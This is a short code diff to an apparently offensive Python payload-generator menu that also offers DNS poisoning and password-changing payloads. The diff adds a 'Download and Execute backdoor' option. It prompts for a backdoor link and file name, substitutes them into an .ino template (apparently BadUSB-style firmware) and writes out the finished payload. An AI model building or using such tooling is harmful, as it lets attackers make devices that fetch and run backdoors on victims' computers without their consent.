@@ -4,7 +4,7 @@ def subcommandmenu():
     print ("""
         1 - Payload local dns poisoning
         2 - Password allusrpass changer
-        3 - edit
+        3 - Download and Execute backdoor
         0 - Back to frist select menu
         """)
 
@@ -43,7 +43,20 @@ def subcommandmenu():
 
 
     elif submenuselect == "3":
-        print ("edit ok")
+        print("Download and Execute ok");
+        newpass = raw_input(str("Digite o link do backdoor : "))
+        backdoor = raw_input(str("Digite o nome do arquivo : "))
+        print (newpass)
+
+        f = open('payloads/Downandexecute.ino', 'r')
+        filedata = f.read()
+        f.close()
+        newdata = filedata.replace("HOST", newpass).replace("PAYLOAD.exe", backdoor)
+        f = open('out/OUT-Downandexecute.ino', 'w')
+        f.write(newdata)
+        f.close()
+        os.system("start out/OUT-Downandexecute.ino")
+
 
 
 
